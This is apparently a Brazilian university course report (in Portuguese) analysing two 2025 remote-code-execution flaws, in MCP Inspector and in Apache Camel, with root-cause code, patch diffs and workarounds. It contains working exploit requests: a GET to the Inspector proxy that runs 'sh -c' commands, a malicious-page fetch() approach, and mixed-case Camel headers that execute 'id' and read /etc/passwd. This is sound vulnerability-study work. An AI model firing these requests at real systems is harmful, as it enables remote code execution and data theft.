---
title: "EP2. Exploração de CVEs"
subtitle: "MAC0696. Cibersegurança e Privacidade"
date: "2026"
lang: pt-BR
geometry: margin=2.3cm
fontsize: 11pt
---

<!--
  Rascunho do PDF (5–10 páginas). Converter com, por exemplo:
     pandoc pdf/relatorio.md -o relatorio.pdf --from gfm --pdf-engine=xelatex \
            --highlight-style=tango -V colorlinks=true
  As duas CVEs foram estudadas em ambiente 100% local e isolado (containers Docker).
-->

## Integrantes do trio

| Nome | Nº USP |
|------|--------|
| Caio Morais Sales | 12557268 |
| _(preencher)_ | |
| _(preencher)_ | |

## Resumo

Este trabalho estuda, explora e corrige duas vulnerabilidades de 2025, ambas levando a
execução remota de código (RCE), mas por mecanismos distintos:

- **CVE-2025-49596**: RCE não-autenticado na ferramenta **MCP Inspector** (`< 0.14.1`),
  disparável por uma página web qualquer contra o proxy local. É a vulnerabilidade da
  demonstração ao vivo.
- **CVE-2025-27636**: RCE no **Apache Camel** por bypass do filtro de headers devido a uma
  comparação case-sensitive, permitindo injetar headers de controle do componente `exec`.

Todo o ambiente roda em containers isolados, com portas publicadas apenas em `127.0.0.1`. Os
"payloads" apenas escrevem provas inócuas (`id`, `hostname`, leitura local de `/etc/passwd`)
dentro dos containers.

---

# CVE-2025-49596 (MCP Inspector)

| | |
|---|---|
| Produto | `@modelcontextprotocol/inspector` |
| Versões afetadas | `< 0.14.1` |
| Correção | `0.14.1` (commit `50df0e1`) |
| Classe | CWE-306 (Missing Authentication for Critical Function) + CORS/DNS-rebinding |
| CVSS (NVD) | 9.4 (crítico) |

MCP Inspector é a ferramenta oficial de desenvolvimento do Model Context Protocol (MCP):
serve para inspecionar e testar servidores MCP localmente. Tem dois componentes: cliente (nas
versões CLI, TUI e Web) e proxy. A vulnerabilidade em questão afeta o cliente Web.

## 1.1 Usando o serviço da maneira esperada

Os dois componentes do MCP inspector, nesse caso, são:

- **Cliente (UI web)** em `http://localhost:6274`;
- **Proxy** (servidor Express) em `http://localhost:6277`, que fica entre a UI e os servidores
  MCP. O navegador, onde a UI roda, é um ambiente incapaz de se comunicar diretamente com a
  maioria dos servidores MCP. O proxy cumpre essa função: é ele quem executa o comando do
  servidor e faz a ponte com a UI. Resumindo: o proxy, nesse caso, é uma ponte de protocolo.

O fluxo de execução legítimo é mais ou menos o seguinte:

1. O desenvolvedor roda npx @modelcontextprotocol/inspector na própria máquina, o que abre a UI web local;
2. Na interface, ele digita o comando do servidor MCP que quer testar. Exemplo:
```uvx mcp-server-git --repository ./meu-repo```;
3. A UI envia esse comando ao proxy local;
4. O proxy inicia o processo do servidor MCP, estabelecendo comunicação via stdio;
5. A partir daí, o Inspector troca mensagens JSON-RPC com o servidor: lista as tools disponíveis,
os resources, os prompts, e permite ao desenvolvedor chamar cada tool manualmente para ver a resposta.

## 1.2 Vulnerabilidade e análise de causa-raiz

Antes da correção, qualquer entidade pode chamar o proxy, não apenas a UI, como é esperado no passo 3
do fluxo ilustrado acima. Não havia qualquer validação da requisição, o que fazia com que o proxy
aceitasse qualquer requisição que chegasse em `localhost:6277`.

Sabendo disso, uma página web maliciosa, hospedando JavaScript (possivelmente obfuscado), poderia
disparar requisições para localhost:6277. O proxy do Inspector, sem exigir nenhum token ou autenticação,
aceita uma requisição do tipo `GET /sse?transportType=stdio&command=id`. Daí, o proxy spawna um processo
executando literalmente o comando recebido na query string. Conclusão: RCE; podemos executar qualquer
processo com as mesmas permissões do usuário que rodava o MCP Inspector.

### Os culpados, no código-fonte do MCP Inspector

Essa vulnerabilidade está relacionada a uma combinação de falhas na implementação do servidor do
MCP Inspector. Ao analisar o arquivo `server/src/index.ts`, na versão 0.14.0, identificamos três
aspectos importantes para compreender como um atacante pode executar comandos arbitrários na
máquina em que o Inspector está sendo executado.

(a) Ausência de restrição quanto à origem das requisições:

```ts
const app = express();
app.use(cors());  // responde Access-Control-Allow-Origin: *
```

A chamada `cors()` habilita o compartilhamento de recursos entre diferentes origens (Cross-Origin
Resource Sharing, CORS), sem estabelecer uma lista de origens autorizadas. Na prática, isso
permite que páginas hospedadas em outros domínios façam requisições ao servidor, sujeitas às
demais restrições impostas pelo navegador.

(b) Endpoints acessíveis sem autenticação

```ts
app.get("/stdio", async (req, res) => { ... createTransport(req) ... });  // linha 273
app.get("/sse",   async (req, res) => { ... createTransport(req) ... });  // linha 323
```

O problema é que essas rotas não possuem middleware de autenticação: qualquer cliente capaz
de acessá-las pode solicitar a criação de um transporte, sem precisar apresentar credenciais.

Além disso, por serem requisições GET consideradas simples pelo mecanismo CORS, elas não
exigem uma requisição preliminar (preflight). Isso facilita a exploração a partir de uma
página web maliciosa: o navegador pode enviar a requisição ao Inspector sem antes realizar
essa verificação.

(c) Execução de comandos fornecidos pela requisição

O aspecto mais crítico está na função `createTransport`, responsável por estabelecer a
comunicação com o servidor MCP solicitado. No caso do transporte stdio, encontramos:

```ts
if (transportType === "stdio") {
  const command = query.command as string;                // controlado pelo atacante
  const origArgs = shellParseArgs(query.args as string);  // controlado pelo atacante
  const { cmd, args } = findActualExecutable(command, origArgs);
  const transport = new StdioClientTransport({ command: cmd, args, env, stderr: "pipe" });
  await transport.start();   // <-- SPAWN do processo do atacante
  return transport;
}
```

Observe que tanto o comando quanto seus argumentos são obtidos diretamente dos
parâmetros da requisição HTTP (`query.command` e `query.args`). Portanto, quem
faz a requisição pode escolher qual programa será executado e quais argumentos
serão passados a ele.

A chamada `transport.start()` inicia o processo correspondente no sistema operacional.
Assim, ao conseguir enviar uma requisição apropriada para o endpoint /stdio, um
atacante pode induzir o Inspector a executar um comando arbitrário na máquina hospedeira.

## 1.3 Exploração

A requisição mínima é apenas:

```
GET http://127.0.0.1:6277/sse?transportType=stdio&command=sh&args=-c%20"id%20>%20/evidence/proof.txt"
```

Implementamos duas formas de explorar o erro.

1. **`exploit.sh` (curl):** prova o núcleo do RCE direto no proxy.
2. **`attacker/index.html` + `exploit.js` (navegador):** algo mais próximo da vida real:
   a vítima só abre uma página aparentemente inofensiva, mas contendo JavaScript malicioso;
   o JS dispara um `fetch()` cross-origin ao proxy.

Saída do `exploit.sh` e log do proxy no mesmo instante:

```
$ ./exploit.sh
[log] Alvo (proxy do Inspector): http://127.0.0.1:6277
[log] Endpoint: GET /sse?transportType=stdio&command=sh&args=-c "echo CVE-2025-49596 RCE proof via curl sem auth > /evidence/proof.txt; id >> /evidence/proof.txt 2>&1; hostname >> /evidence/proof.txt"
[log] Enviando requisição...
[log] Resposta do servidor: event: endpoint
data: /message?sessionId=090bbaaa-579b-447c-af25-e669989b50d1
[log] RCE confirmado. Conteúdo de evidence/proof.txt:
CVE-2025-49596 RCE proof via curl sem auth
uid=0(root) gid=0(root) groups=0(root)
f69945363089
```

Replicando fielmente o `fetch()` do navegador (GET com `Origin: http://localhost:8080`), o
proxy respondeu 200, devolveu `Access-Control-Allow-Origin: *` e criou o `proof.txt`. Ou
seja, basta visitar a página para o comando rodar.

## 1.4 Workarounds paliativos (antes do patch)

Mapeiam 1:1 para as camadas que o patch oficializou; o ideal é combinar os três:

- Bind só em loopback: `HOST=127.0.0.1 npx @modelcontextprotocol/inspector` (e publicar
  portas apenas em `127.0.0.1`, como no nosso compose). Não protege do ataque pelo próprio
  navegador da vítima, mas tira o alvo da LAN.
- Allowlist de `Origin` num reverse proxy à frente do 6277 (ex.: nginx `if ($http_origin !~
  "^http://(localhost|127\.0\.0\.1):6274$") { return 403; }`). Bloqueia requisições vindas
  de sites maliciosos (o navegador envia o Origin da página atacante).
- Segredo compartilhado (header `Authorization` exigido no proxy).

Além disso, há outras medidas paliativas que não corrigem o problema, mas evitam maiores
estragos para o caso de vulnerabilidades como essa serem exploradas. Algumas delas são:
não deixar o Inspector ligado em background, rodar sem privilégios e manter firewall local.

## 1.5 Correção definitiva (commit 50df0e1 → 0.14.1)

Três correções em `server/src/index.ts`:

```diff
# (1) bind local por padrão
-const server = app.listen(PORT);
+const HOST = process.env.HOST || '127.0.0.1';
+const server = app.listen(PORT, HOST);

# (2) token de sessão obrigatório
+const sessionToken = randomBytes(32).toString('hex');
+const authMiddleware = (req, res, next) => {
+  if (authDisabled) return next();
+  const authHeader = req.headers.authorization;
+  if (!authHeader || !authHeader.startsWith('Bearer ')) { sendUnauthorized(); return; }
+  // ...comparação com crypto.timingSafeEqual(providedToken, sessionToken)...
+  next();
+};

# (3) validação de Origin (anti-DNS-rebinding)
+const originValidationMiddleware = (req, res, next) => {
+  const allowed = [`http://localhost:6274`, `http://127.0.0.1:6274`];
+  if (req.headers.origin && !allowed.includes(req.headers.origin)) {
+    res.status(403).json({ error: 'Forbidden - invalid origin' }); return;
+  }
+  next();
+};

-app.get("/sse", async (req, res) => { ... });
+app.get("/sse", originValidationMiddleware, authMiddleware, async (req, res) => { ... });
```

Aplicado a `/mcp`, `/stdio`, `/sse`, `/message` e `/config`. Verificado (alvo 0.14.1): o
mesmo `curl` sem token recebe **401 Unauthorized**; o mesmo `fetch()` do navegador (origem
`localhost:8080`) recebe **403 Forbidden - invalid origin**; nenhum `proof.txt` é criado.

---

# Parte II — CVE-2025-27636 (Apache Camel)

## 2.1 O serviço

O **Apache Camel** é um framework de integração: *rotas* ligam uma entrada (`from`) a
processadores/saídas (`to`) via componentes. Componentes **HTTP** (platform-http, camel-http,
jetty, netty-http, servlet…) recebem requisições externas; o componente **`exec`** executa
programas locais, configuráveis por **headers do exchange** (`CamelExecCommandExecutable`,
`CamelExecCommandArgs`, …). Para o cliente externo não injetar esses headers internos, os
componentes HTTP aplicam o **`DefaultHeaderFilterStrategy`**, que remove headers começando com
`Camel`/`org.apache.camel`. **Esse filtro é a fronteira de segurança.**

| | |
|---|---|
| Produto | Apache Camel (`camel-support`) |
| Versões afetadas | 3.10.0–3.22.3, 4.8.0–4.8.4, 4.10.0–4.10.1 |
| Correção | 3.22.4 / 4.8.5 / 4.10.2 (commit `781491b`) |
| Relacionada | **CVE-2025-29891** (mesma causa, via query/form params) |

## 2.2 Análise de causa-raiz (no código-fonte)

Arquivo **`DefaultHeaderFilterStrategy.java`**. O padrão de filtro é declarado
case-insensitive…

```java
public static final Pattern CAMEL_FILTER_PATTERN
        = Pattern.compile("(?i)(Camel|org\\.apache\\.camel)[.a-zA-z0-9]*");  // (?i) = ignore case
```

…mas um **atalho de performance** em `tryPattern` ignora o `(?i)` e compara case-sensitive:

```java
if (pattern == CAMEL_FILTER_PATTERN) {
    boolean match = headerName.startsWith("Camel") || headerName.startsWith("camel")
            || headerName.startsWith("org.apache.camel.");   // CASE-SENSITIVE — só esses prefixos
    if (match) return true;
    // nunca aplica o regex (?i): o atalho curto-circuita
} else if (pattern.matcher(headerName).matches()) { return true; }
```

Um header `CAmelExecCommandExecutable` (segundo caractere maiúsculo) não casa com `Camel` nem
`camel` → **não é filtrado**. E como os headers do `Message` vivem num `CaseInsensitiveMap`, o
componente `exec` ainda o resolve como `CamelExecCommandExecutable` e **sobrescreve o executável**.

> **Discrepância fatal:** o *filtro* é case-sensitive, mas o *consumo* é case-insensitive. Case
> torto passa pelo filtro e ainda é entendido pelo consumidor.

O caminho HTTP é afetado porque sua estratégia roda em modo lowerCase:

```java
public class PlatformHttpHeaderFilterStrategy extends DefaultHeaderFilterStrategy {
    protected void initialize() { setLowerCase(true); /* ... */ }
}
```

## 2.3 Exploração

Rota mínima: `from("platform-http:/run").to("exec:echo?args=rota-configurou-echo-benigno")`.
**Evidência capturada (Camel 4.8.4)** — saída real do `poc.sh`:

```
[2] 'CamelExecCommandExecutable: id'  (case canônico)             -> rota-configurou-echo-benigno   (FILTRADO)
[3] 'CAmelExecCommandExecutable: id' + 'CAmelExecCommandArgs: -a' -> uid=0(root) gid=0(root) groups=0(root)
[4] 'CAmelExecCommandExecutable: cat' + '...Args: /etc/passwd'    -> root:x:0:0:root:/root:/bin/bash ...
```

O caso [2] (case canônico) é barrado; os casos [3]/[4] (case torto) **executam o comando do
atacante** — o bypass → RCE.

**CVE-2025-29891 (relacionada).** Mesma causa-raiz, outra porta de entrada: componentes HTTP que
mapeiam **parâmetros de query/form** para headers permitem `?CAmelExecCommandExecutable=...`
direto na URL, alcançando o mesmo sink. O mesmo commit corrige ambas.

## 2.4 Workarounds paliativos

- **Correção definitiva:** atualizar para 3.22.4 / 4.8.5 / 4.10.2+.
- **Não expor componentes sensíveis** (`exec`, SpEL, etc.) diretamente atrás de HTTP.
- Logo após o `from`, aplicar `removeHeaders("Camel*")` ou uma **allowlist explícita** dos
  headers aceitos; filtrar também parâmetros de query (cobre a CVE-2025-29891).

## 2.5 Correção definitiva (commit 781491b)

O patch restaura o case-insensitive no caminho `lowerCase`:

```diff
 if (pattern == CAMEL_FILTER_PATTERN) {
     boolean match = headerName.startsWith("Camel") || headerName.startsWith("camel")
             || headerName.startsWith("org.apache.camel.");
     if (match) return true;
+    if (lowerCase) {
+        if (lower == null) lower = headerName.toLowerCase();
+        match = lower.startsWith("camel") || lower.startsWith("org.apache.camel.");
+        if (match) return true;
+    }
 } else if (pattern.matcher(headerName).matches()) { return true; }
```

Agora `CAmelExecCommandExecutable` → `camelexeccommandexecutable` → casa com `camel` → é
filtrado. A mesma correção vai para `evalFilterMatch`. **Verificado (Camel 4.8.5):** o mesmo
ataque [3]/[4] passa a retornar o `echo` benigno — neutralizado.

---

# Créditos e referências

- **CVE-2025-49596:** advisory GHSA-7f8r-222p-6f5g (`modelcontextprotocol/inspector`);
  divulgação/pesquisa original **Oligo Security** (relatório público "MCP Inspector RCE", 2025);
  patch commit `50df0e1ec488f3983740b4d28d2a968f12eb8979`.
- **CVE-2025-27636 / CVE-2025-29891:** advisories oficiais do Apache Camel; patch commit
  `781491b446921341f87a13824be4f7b5063776fc` (CAMEL-21828, Claus Ibsen).
- Trechos de código citados das versões vulneráveis (`inspector@0.14.0`, `camel-4.10.1`/`4.8.4`)
  e dos diffs dos patches.
- Os PoCs (página atacante, `exploit.sh`, `poc.sh`, rota Camel) foram escritos pelo grupo a
  partir dessas fontes.
